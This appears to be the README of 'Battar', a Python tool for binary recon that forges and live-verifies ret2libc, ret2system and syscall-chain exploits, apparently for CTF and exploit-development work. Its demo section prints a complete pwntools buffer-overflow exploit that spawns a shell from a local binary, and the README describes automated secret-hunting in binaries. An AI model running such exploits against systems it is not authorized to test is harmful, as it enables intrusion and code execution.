<div align="center">

<!-- ═══════════════════════════════════════════════════════════════════════ -->
<!-- ANIMATED SWORD SLASH HEADER -->
<!-- ═══════════════════════════════════════════════════════════════════════ -->
<svg width="800" height="180" viewBox="0 0 800 180" xmlns="http://www.w3.org/2000/svg">
<defs>
<linearGradient id="bladeGrad" x1="0%" y1="0%" x2="100%" y2="0%">
<stop offset="0%" stop-color="#1a0000"/>
<stop offset="40%" stop-color="#ff1a1a"/>
<stop offset="70%" stop-color="#ff6666"/>
<stop offset="100%" stop-color="#ffffff"/>
</linearGradient>
<filter id="glow">
<feGaussianBlur stdDeviation="3" result="blur"/>
<feMerge>
<feMergeNode in="blur"/>
<feMergeNode in="blur"/>
<feMergeNode in="SourceGraphic"/>
</feMerge>
</filter>
<filter id="sparks">
<feGaussianBlur stdDeviation="1.5"/>
</filter>
</defs>

<!-- Background -->
<rect width="800" height="180" fill="#0d0d0d" rx="8"/>

<!-- Sword blade path -->
<path d="M 80 140 Q 250 135, 400 90 Q 550 45, 720 30"
fill="none" stroke="url(#bladeGrad)" stroke-width="3"
stroke-linecap="round" filter="url(#glow)" opacity="0">
<animate attributeName="stroke-dasharray" from="0,800" to="800,0" dur="1.5s" begin="0.2s" fill="freeze"/>
<animate attributeName="opacity" from="0" to="1" dur="0.3s" begin="0.2s" fill="freeze"/>
<animate attributeName="opacity" values="1;0.6;1" dur="2s" begin="2s" repeatCount="indefinite"/>
</path>

<!-- Second slash (cross) -->
<path d="M 120 40 Q 280 80, 420 100 Q 580 125, 700 145"
fill="none" stroke="#ff3333" stroke-width="2"
stroke-linecap="round" filter="url(#glow)" opacity="0">
<animate attributeName="stroke-dasharray" from="0,800" to="800,0" dur="1.2s" begin="0.8s" fill="freeze"/>
<animate attributeName="opacity" from="0" to="0.7" dur="0.3s" begin="0.8s" fill="freeze"/>
<animate attributeName="opacity" values="0.7;0.3;0.7" dur="3s" begin="2.5s" repeatCount="indefinite"/>
</path>

<!-- Sparks particles -->
<circle cx="400" cy="90" r="2" fill="#ffcc00" filter="url(#sparks)" opacity="0">
<animate attributeName="opacity" values="0;1;0" dur="0.6s" begin="1.5s" repeatCount="indefinite"/>
<animate attributeName="cy" from="90" to="60" dur="0.6s" begin="1.5s" repeatCount="indefinite"/>
<animate attributeName="cx" from="400" to="430" dur="0.6s" begin="1.5s" repeatCount="indefinite"/>
</circle>
<circle cx="420" cy="100" r="1.5" fill="#ff6600" filter="url(#sparks)" opacity="0">
<animate attributeName="opacity" values="0;1;0" dur="0.8s" begin="1.7s" repeatCount="indefinite"/>
<animate attributeName="cy" from="100" to="70" dur="0.8s" begin="1.7s" repeatCount="indefinite"/>
<animate attributeName="cx" from="420" to="450" dur="0.8s" begin="1.7s" repeatCount="indefinite"/>
</circle>
<circle cx="380" cy="85" r="1.5" fill="#ffcc00" filter="url(#sparks)" opacity="0">
<animate attributeName="opacity" values="0;1;0" dur="0.5s" begin="1.6s" repeatCount="indefinite"/>
<animate attributeName="cy" from="85" to="55" dur="0.5s" begin="1.6s" repeatCount="indefinite"/>
<animate attributeName="cx" from="380" to="360" dur="0.5s" begin="1.6s" repeatCount="indefinite"/>
</circle>

<!-- Title text -->
<text x="400" y="110" text-anchor="middle" font-family="monospace" font-size="42" font-weight="bold" fill="#ff2a2a" opacity="0">
BATTAR
<animate attributeName="opacity" from="0" to="1" dur="0.8s" begin="1.2s" fill="freeze"/>
<animate attributeName="fill" values="#ff2a2a;#ff6666;#ff2a2a" dur="3s" begin="2.5s" repeatCount="indefinite"/>
</text>

<!-- Subtitle -->
<text x="400" y="135" text-anchor="middle" font-family="monospace" font-size="12" fill="#888" opacity="0">
بتّار —part of RED-CORE TOOLKIT
<animate attributeName="opacity" from="0" to="1" dur="0.6s" begin="1.8s" fill="freeze"/>
</text>

<!-- Decorative corner brackets -->
<path d="M 20 20 L 50 20 L 50 25 L 25 25 L 25 50 L 20 50 Z" fill="#ff2a2a" opacity="0">
<animate attributeName="opacity" from="0" to="0.6" dur="0.5s" begin="2s" fill="freeze"/>
</path>
<path d="M 780 20 L 750 20 L 750 25 L 775 25 L 775 50 L 780 50 Z" fill="#ff2a2a" opacity="0">
<animate attributeName="opacity" from="0" to="0.6" dur="0.5s" begin="2.1s" fill="freeze"/>
</path>
<path d="M 20 160 L 50 160 L 50 155 L 25 155 L 25 130 L 20 130 Z" fill="#ff2a2a" opacity="0">
<animate attributeName="opacity" from="0" to="0.6" dur="0.5s" begin="2.2s" fill="freeze"/>
</path>
<path d="M 780 160 L 750 160 L 750 155 L 775 155 L 775 130 L 780 130 Z" fill="#ff2a2a" opacity="0">
<animate attributeName="opacity" from="0" to="0.6" dur="0.5s" begin="2.3s" fill="freeze"/>
</path>
</svg>

<!-- ═══════════════════════════════════════════════════════════════════════ -->
<!-- ANIMATED BADGES -->
<!-- ═══════════════════════════════════════════════════════════════════════ -->
<p>
<img src="https://img.shields.io/badge/python-3.8%2B-ff2a2a?style=flat-square&logo=python&logoColor=white&labelColor=1a1a1a">
<img src="https://img.shields.io/badge/platform-linux-1a1a1a?style=flat-square&logo=linux&logoColor=ff2a2a">
<img src="https://img.shields.io/badge/arch-x86%20|%20x86__64-1a1a1a?style=flat-square">
<img src="https://img.shields.io/badge/exploits-verified%20live-ff2a2a?style=flat-square">
<img src="https://img.shields.io/badge/license-MIT-ff2a2a?style=flat-square">
</p>

<br>

<!-- ═══════════════════════════════════════════════════════════════════════ -->
<!-- ANIMATED PULL-QUOTE -->
<!-- ═══════════════════════════════════════════════════════════════════════ -->
<svg width="600" height="60" viewBox="0 0 600 60" xmlns="http://www.w3.org/2000/svg">
<defs>
<linearGradient id="quoteGrad" x1="0%" y1="0%" x2="100%" y2="0%">
<stop offset="0%" stop-color="#444"/>
<stop offset="50%" stop-color="#ff2a2a"/>
<stop offset="100%" stop-color="#444"/>
</linearGradient>
</defs>
<text x="300" y="35" text-anchor="middle" font-family="Georgia, serif" font-size="16" font-style="italic" fill="url(#quoteGrad)">
"The blade that doesn't just point at the target — it cuts."
<animate attributeName="opacity" values="0.5;1;0.5" dur="4s" repeatCount="indefinite"/>
</text>
</svg>

**Static & dynamic recon for ELF and PE binaries — built for exploit development.**

</div>

---

## 🩸 What is Battar?

`battar` is a single-file Python CLI that replaces your entire recon toolchain. It doesn't just *describe* a binary's weaknesses — it **forges working exploits** and **verifies them live** before handing you the code.

| What others do | What Battar does |
| :--- | :--- |
| `checksec` says "no canary" | *"No canary → classic overflow viable → here's the exploit"* |
| `strings` dumps output | Auto-flags **19 secret categories** (keys, JWTs, wallets, creds) |
| ROPgadget lists gadgets | Builds complete `ret2libc` chains with real addresses filled in |
| Template generators print code | **Runs the exploit locally**, confirms the shell, then shows it to you |

---

## ⚡ Strike Patterns

Battar detects which of four exploitation strategies apply and auto-forges a ready-to-run `pwntools` script for each:

<div align="center">

<!-- ═══════════════════════════════════════════════════════════════════════ -->
<!-- ANIMATED STRATEGY CARDS -->
<!-- ═══════════════════════════════════════════════════════════════════════ -->
<table>
<tr>
<td>

<svg width="280" height="120" viewBox="0 0 280 120" xmlns="http://www.w3.org/2000/svg">
<rect width="280" height="120" fill="#0d0d0d" stroke="#ff2a2a" stroke-width="1" rx="6"/>
<text x="140" y="30" text-anchor="middle" font-family="monospace" font-size="14" font-weight="bold" fill="#ff2a2a">STRATEGY A</text>
<text x="140" y="55" text-anchor="middle" font-family="monospace" font-size="11" fill="#ccc">Direct ret2system</text>
<text x="140" y="78" text-anchor="middle" font-family="monospace" font-size="10" fill="#888">system() + "/bin/sh" in binary</text>
<text x="140" y="100" text-anchor="middle" font-family="monospace" font-size="10" fill="#4ade80">❌ NO LEAK NEEDED</text>
<!-- Pulse ring -->
<circle cx="140" cy="60" r="45" fill="none" stroke="#ff2a2a" stroke-width="0.5" opacity="0">
<animate attributeName="r" from="30" to="55" dur="2s" repeatCount="indefinite"/>
<animate attributeName="opacity" values="0.6;0;0.6" dur="2s" repeatCount="indefinite"/>
</circle>
</svg>

</td>
<td>

<svg width="280" height="120" viewBox="0 0 280 120" xmlns="http://www.w3.org/2000/svg">
<rect width="280" height="120" fill="#0d0d0d" stroke="#ff9500" stroke-width="1" rx="6"/>
<text x="140" y="30" text-anchor="middle" font-family="monospace" font-size="14" font-weight="bold" fill="#ff9500">STRATEGY B</text>
<text x="140" y="55" text-anchor="middle" font-family="monospace" font-size="11" fill="#ccc">Leak, then ret2system</text>
<text x="140" y="78" text-anchor="middle" font-family="monospace" font-size="10" fill="#888">puts/printf available to leak libc</text>
<text x="140" y="100" text-anchor="middle" font-family="monospace" font-size="10" fill="#fbbf24">✅ LEAK REQUIRED</text>
<!-- Pulse ring -->
<circle cx="140" cy="60" r="45" fill="none" stroke="#ff9500" stroke-width="0.5" opacity="0">
<animate attributeName="r" from="30" to="55" dur="2.5s" repeatCount="indefinite"/>
<animate attributeName="opacity" values="0.5;0;0.5" dur="2.5s" repeatCount="indefinite"/>
</circle>
</svg>

</td>
</tr>
<tr>
<td>

<svg width="280" height="120" viewBox="0 0 280 120" xmlns="http://www.w3.org/2000/svg">
<rect width="280" height="120" fill="#0d0d0d" stroke="#a855f7" stroke-width="1" rx="6"/>
<text x="140" y="30" text-anchor="middle" font-family="monospace" font-size="14" font-weight="bold" fill="#a855f7">STRATEGY C</text>
<text x="140" y="55" text-anchor="middle" font-family="monospace" font-size="11" fill="#ccc">Raw execve() syscall</text>
<text x="140" y="78" text-anchor="middle" font-family="monospace" font-size="10" fill="#888">"/bin/sh" + syscall gadgets in binary</text>
<text x="140" y="100" text-anchor="middle" font-family="monospace" font-size="10" fill="#4ade80">❌ NO LIBC NEEDED</text>
<!-- Pulse ring -->
<circle cx="140" cy="60" r="45" fill="none" stroke="#a855f7" stroke-width="0.5" opacity="0">
<animate attributeName="r" from="30" to="55" dur="2.2s" repeatCount="indefinite"/>
<animate attributeName="opacity" values="0.5;0;0.5" dur="2.2s" repeatCount="indefinite"/>
</circle>
</svg>

</td>
<td>

<svg width="280" height="120" viewBox="0 0 280 120" xmlns="http://www.w3.org/2000/svg">
<rect width="280" height="120" fill="#0d0d0d" stroke="#06b6d4" stroke-width="1" rx="6"/>
<text x="140" y="30" text-anchor="middle" font-family="monospace" font-size="14" font-weight="bold" fill="#06b6d4">STRATEGY D</text>
<text x="140" y="55" text-anchor="middle" font-family="monospace" font-size="11" fill="#ccc">open→read→write flag chain</text>
<text x="140" y="78" text-anchor="middle" font-family="monospace" font-size="10" fill="#888">CTF flag + syscall gadgets + .bss</text>
<text x="140" y="100" text-anchor="middle" font-family="monospace" font-size="10" fill="#4ade80">❌ NO LEAK NEEDED</text>
<!-- Pulse ring -->
<circle cx="140" cy="60" r="45" fill="none" stroke="#06b6d4" stroke-width="0.5" opacity="0">
<animate attributeName="r" from="30" to="55" dur="2.8s" repeatCount="indefinite"/>
<animate attributeName="opacity" values="0.5;0;0.5" dur="2.8s" repeatCount="indefinite"/>
</circle>
</svg>

</td>
</tr>
</table>

</div>

Every forged exploit:

- Auto-fills `system@plt`, gadget addresses, GOT entries
- Detects `pop rdi; ret` in both binary **and** resolved libc
- Prefers combined multi-register gadgets for shorter chains
- Warns if PIE or stack canary breaks the naive approach
- **Self-verifies** — runs against the target, confirms shell/flag, reports success or exact failure reason

---

## 🎯 Dynamic Verification

<!-- ═══════════════════════════════════════════════════════════════════════ -->
<!-- ANIMATED EXECUTION PIPELINE -->
<!-- ═══════════════════════════════════════════════════════════════════════ -->
<div align="center">

<svg width="700" height="320" viewBox="0 0 700 320" xmlns="http://www.w3.org/2000/svg">
<defs>
<linearGradient id="pipeGrad" x1="0%" y1="0%" x2="0%" y2="100%">
<stop offset="0%" stop-color="#ff2a2a"/>
<stop offset="100%" stop-color="#8b0000"/>
</linearGradient>
<filter id="textGlow">
<feGaussianBlur stdDeviation="1" result="blur"/>
<feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge>
</filter>
</defs>

<rect width="700" height="320" fill="#0a0a0a" rx="8"/>

<!-- Pipeline connector line -->
<line x1="60" y1="50" x2="60" y2="290" stroke="#333" stroke-width="2" stroke-dasharray="4,4"/>

<!-- Step 1 -->
<circle cx="60" cy="50" r="8" fill="#ff2a2a">
<animate attributeName="r" values="8;10;8" dur="2s" repeatCount="indefinite"/>
<animate attributeName="opacity" values="1;0.7;1" dur="2s" repeatCount="indefinite"/>
</circle>
<text x="85" y="40" font-family="monospace" font-size="11" fill="#ff2a2a" font-weight="bold">[1]</text>
<text x="85" y="55" font-family="monospace" font-size="11" fill="#ccc">Fuzz with De Bruijn cyclic patterns</text>
<text x="85" y="70" font-family="monospace" font-size="10" fill="#666">→ Crash the target</text>

<!-- Step 2 -->
<circle cx="60" cy="100" r="6" fill="#ff6b35">
<animate attributeName="r" values="6;8;6" dur="2.2s" repeatCount="indefinite"/>
</circle>
<text x="85" y="90" font-family="monospace" font-size="11" fill="#ff6b35" font-weight="bold">[2]</text>
<text x="85" y="105" font-family="monospace" font-size="11" fill="#ccc">Read corefile</text>
<text x="85" y="120" font-family="monospace" font-size="10" fill="#666">→ Extract exact overflow offset from registers</text>

<!-- Step 3 -->
<circle cx="60" cy="150" r="6" fill="#fbbf24">
<animate attributeName="r" values="6;8;6" dur="2.4s" repeatCount="indefinite"/>
</circle>
<text x="85" y="140" font-family="monospace" font-size="11" fill="#fbbf24" font-weight="bold">[3]</text>
<text x="85" y="155" font-family="monospace" font-size="11" fill="#ccc">Distinguish real overflow from canary kill</text>
<text x="85" y="170" font-family="monospace" font-size="10" fill="#666">→ SIGABRT detection, not generic failure</text>

<!-- Step 4 -->
<circle cx="60" cy="200" r="6" fill="#a855f7">
<animate attributeName="r" values="6;8;6" dur="2.6s" repeatCount="indefinite"/>
</circle>
<text x="85" y="190" font-family="monospace" font-size="11" fill="#a855f7" font-weight="bold">[4]</text>
<text x="85" y="205" font-family="monospace" font-size="11" fill="#ccc">Forge exploit → run it → confirm shell/flag</text>
<text x="85" y="220" font-family="monospace" font-size="10" fill="#666">→ Real code execution validation</text>

<!-- Step 5 -->
<circle cx="60" cy="250" r="6" fill="#4ade80">
<animate attributeName="r" values="6;8;6" dur="2.8s" repeatCount="indefinite"/>
</circle>
<text x="85" y="240" font-family="monospace" font-size="11" fill="#4ade80" font-weight="bold">[5]</text>
<text x="85" y="255" font-family="monospace" font-size="11" fill="#ccc">Auto-fix x86-64 movaps alignment crashes</text>
<text x="85" y="270" font-family="monospace" font-size="10" fill="#666">→ Retry with alignment gadget, keep what works</text>

<!-- Animated data flow dots -->
<circle cx="60" cy="50" r="2" fill="#ff2a2a" opacity="0">
<animate attributeName="cy" from="50" to="290" dur="4s" repeatCount="indefinite"/>
<animate attributeName="opacity" values="0;1;1;0" dur="4s" repeatCount="indefinite"/>
</circle>
<circle cx="60" cy="50" r="2" fill="#ff2a2a" opacity="0">
<animate attributeName="cy" from="50" to="290" dur="4s" begin="1.3s" repeatCount="indefinite"/>
<animate attributeName="opacity" values="0;1;1;0" dur="4s" begin="1.3s" repeatCount="indefinite"/>
</circle>
<circle cx="60" cy="50" r="2" fill="#ff2a2a" opacity="0">
<animate attributeName="cy" from="50" to="290" dur="4s" begin="2.6s" repeatCount="indefinite"/>
<animate attributeName="opacity" values="0;1;1;0" dur="4s" begin="2.6s" repeatCount="indefinite"/>
</circle>

<!-- Status bar at bottom -->
<rect x="20" y="295" width="0" height="3" fill="url(#pipeGrad)" rx="1.5">
<animate attributeName="width" from="0" to="660" dur="8s" repeatCount="indefinite"/>
</rect>
</svg>

</div>

> ⚠️ **Safety**: `--auto-offset` executes the target locally. Off by default. Only use on trusted/authorized binaries.

---

## 📊 Recon Matrix

<div align="center">

| Section | ELF | PE |
| :--- | :---: | :---: |
| **Build Info** — compiler, linker, Build ID, PDB path | ✅ | ✅ |
| **Packer Detection** — UPX, ASPack, Themida, VMProtect, entropy heuristics | ✅ | ✅ |
| **Entropy Analysis** — overall + per-section Shannon entropy with visual bars | ✅ | ✅ |
| **Symbols / Functions / PLT / GOT** | ✅ | — |
| **Sections / Imports / Exports** | — | ✅ |
| **Strings** — fast in-process extraction, no shell-out | ✅ | ✅ |
| **Interesting Strings** — 19 auto-flagged secret categories | ✅ | ✅ |
| **Dangerous Functions** — 40+ risky APIs by severity with reasons | ✅ | ✅ |
| **ROP Gadgets** — byte-level search across binary + resolved libc | ✅ | — |
| **Exploit Helper (A–D)** | ✅ x86 / x86-64 | — |
| **Dynamic Verification** | ✅ x86-64 (full), x86 (offset only) | — |

</div>

---

## 🛠️ Installation

```bash
# Dependencies
pip install pwntools pefile capstone

# Optional but recommended for corefile analysis
sudo apt install gdb

# Clone & run
git clone https://github.com/yourname/battar.git
cd battar
python battar.py <binary> [options]
```

---

## 🚀 Usage

```bash
# Full recon, no truncation
battar ./chall --all

# Exploit-relevant sections only
battar ./chall --section dangerous exploit gadgets

# Generate AND verify a working exploit locally
battar ./chall --section exploit --auto-offset

# Wider crash-detection window for heavy binaries
battar ./chall --section exploit --auto-offset --auto-offset-timeout 15

# Deep secret hunting in a PE
battar ./suspicious.exe --section interesting --min-len 6 --all

# Stripped static binary — what still leaks?
battar ./target_stripped --section build packer entropy dangerous gadgets --all
```

### CLI Reference

| Flag | Description |
| :--- | :--- |
| `--section NAME [NAME ...]` | Run only these sections (space-separated). File info & protections always print. |
| `--all` | Show every entry; disable 40-row truncation |
| `--limit N` | Rows per section before truncating (default: `40`) |
| `--min-len N` | Minimum string length for `--section strings` (default: `4`) |
| `--auto-offset` | **Execute target locally** to detect overflow offset & verify exploit |
| `--auto-offset-timeout N` | Crash-detection timeout per attempt (default: `5`) |

**Valid sections:** `build`, `packer`, `entropy`, `functions`, `symbols`, `plt`, `got`, `sections`, `imports`, `exports`, `strings`, `interesting`, `dangerous`, `exploit`, `gadgets`

---

## 📺 Live Demo

```javascript
 PROTECTIONS (checksec)
══════════════════════════════════════════════════════════════════════
  NX                    Enabled
     └─ Stack is non-executable, need ROP/ret2libc instead of direct shellcode
  Canary                Disabled
     └─ No protection on the return address, a classic buffer overflow may work directly
  ...

 EXPLOIT HELPER (ret2libc / ret2system)
══════════════════════════════════════════════════════════════════════
  system() in PLT           Yes
  "/bin/sh" in binary       Yes
  pop rdi; ret (binary)     0x40115e

  [!] --auto-offset: running the target locally with a cyclic pattern (timeout 5s)...
  [+] Detected OFFSET = 72 (crash via rbp=0x6161617261616171, cyclic offset 64 (+8))

  Strategy A: Direct ret2system (no leak needed)

  from pwn import *

  elf = ELF('./chall')
  p = process(elf.path)

  OFFSET = 72              # auto-detected via --auto-offset
  POP_RDI = 0x40115e       # pop rdi; ret (found in the binary)

  payload  = b'A' * OFFSET
  payload += p64(POP_RDI)
  payload += p64(0x402004)   # "/bin/sh" found inside the binary
  payload += p64(0x401054)   # system@plt

  p.sendline(payload)
  p.interactive()

  [✓] VERIFIED WORKING locally — shell confirmed (echo marker received back)

 RISK SUMMARY
══════════════════════════════════════════════════════════════════════
  Format            ELF
  NX                ✓ Enabled
  Canary            ✗ Disabled
  Exploit path      ret2system (direct, no leak)

  Overall verdict   [ HIGH RISK ]
```

---

<!-- ═══════════════════════════════════════════════════════════════════════ -->
<!-- ANIMATED RISK GAUGE -->
<!-- ═══════════════════════════════════════════════════════════════════════ -->
<div align="center">

### Risk Assessment Visualization

<svg width="500" height="140" viewBox="0 0 500 140" xmlns="http://www.w3.org/2000/svg">
<defs>
<linearGradient id="gaugeGrad" x1="0%" y1="0%" x2="100%" y2="0%">
<stop offset="0%" stop-color="#4ade80"/>
<stop offset="50%" stop-color="#fbbf24"/>
<stop offset="100%" stop-color="#ff2a2a"/>
</linearGradient>
</defs>

<!-- Gauge background -->
<rect x="50" y="60" width="400" height="20" fill="#1a1a1a" rx="10" stroke="#333" stroke-width="1"/>

<!-- Animated fill -->
<rect x="50" y="60" width="0" height="20" fill="url(#gaugeGrad)" rx="10">
<animate attributeName="width" from="0" to="340" dur="2s" fill="freeze"/>
<animate attributeName="opacity" values="0.8;1;0.8" dur="1.5s" begin="2s" repeatCount="indefinite"/>
</rect>

<!-- Labels -->
<text x="50" y="50" font-family="monospace" font-size="10" fill="#4ade80">LOW</text>
<text x="230" y="50" font-family="monospace" font-size="10" fill="#fbbf24" text-anchor="middle">MEDIUM</text>
<text x="430" y="50" font-family="monospace" font-size="10" fill="#ff2a2a" text-anchor="end">HIGH</text>

<!-- Animated needle -->
<line x1="50" y1="70" x2="50" y2="70" stroke="#fff" stroke-width="2" stroke-linecap="round">
<animate attributeName="x2" from="50" to="390" dur="2s" fill="freeze"/>
</line>
<circle cx="50" cy="70" r="4" fill="#fff">
<animate attributeName="cx" from="50" to="390" dur="2s" fill="freeze"/>
</circle>

<!-- Result text -->
<text x="250" y="115" text-anchor="middle" font-family="monospace" font-size="16" font-weight="bold" fill="#ff2a2a" opacity="0">
[ HIGH RISK ]
<animate attributeName="opacity" from="0" to="1" dur="0.5s" begin="2.2s" fill="freeze"/>
<animate attributeName="opacity" values="1;0.6;1" dur="1s" begin="3s" repeatCount="indefinite"/>
</text>
</svg>

</div>

---

## 🧠 Design Philosophy

- **Nothing without evidence.** Missing gadget? Says `<FILL IN>` + tells you exactly how to find it. Verification failed? Reports the actual reason, never silent fallback.
- **Byte-pattern gadget search.** Any address with the right bytes is a valid ROP target — plain byte scans across `.text` are correct, fast, and need no disassembler.
- **Truncated by default, complete on demand.** Every listing caps at 40 rows with a clear "N more not shown" note; `--all` removes the cap entirely.

---

<div align="center">

<br>

<!-- ═══════════════════════════════════════════════════════════════════════ -->
<!-- ANIMATED CLOSING SWORD -->
<!-- ═══════════════════════════════════════════════════════════════════════ -->
<svg width="300" height="80" viewBox="0 0 300 80" xmlns="http://www.w3.org/2000/svg">
<defs>
<linearGradient id="closeGrad" x1="0%" y1="0%" x2="100%" y2="0%">
<stop offset="0%" stop-color="#ff2a2a"/>
<stop offset="50%" stop-color="#fff"/>
<stop offset="100%" stop-color="#ff2a2a"/>
</linearGradient>
</defs>

<!-- Sword blade -->
<path d="M 30 60 Q 100 55, 150 40 Q 200 25, 270 20"
fill="none" stroke="url(#closeGrad)" stroke-width="2" stroke-linecap="round" opacity="0.8">
<animate attributeName="stroke-dasharray" from="0,300" to="300,0" dur="2s" fill="freeze"/>
</path>

<!-- Cross guard -->
<line x1="25" y1="55" x2="40" y2="65" stroke="#ff2a2a" stroke-width="2">
<animate attributeName="opacity" from="0" to="1" dur="0.5s" begin="1.5s" fill="freeze"/>
</line>
<line x1="25" y1="65" x2="40" y2="55" stroke="#ff2a2a" stroke-width="2">
<animate attributeName="opacity" from="0" to="1" dur="0.5s" begin="1.6s" fill="freeze"/>
</line>

<!-- Spark at tip -->
<circle cx="270" cy="20" r="3" fill="#ffcc00" opacity="0">
<animate attributeName="opacity" values="0;1;0" dur="0.8s" begin="2s" repeatCount="indefinite"/>
<animate attributeName="r" values="2;5;2" dur="0.8s" begin="2s" repeatCount="indefinite"/>
</circle>
</svg>

**Part of the Battar red-core toolkit**

*Made for the ones who don't stop at recon.*

</div>
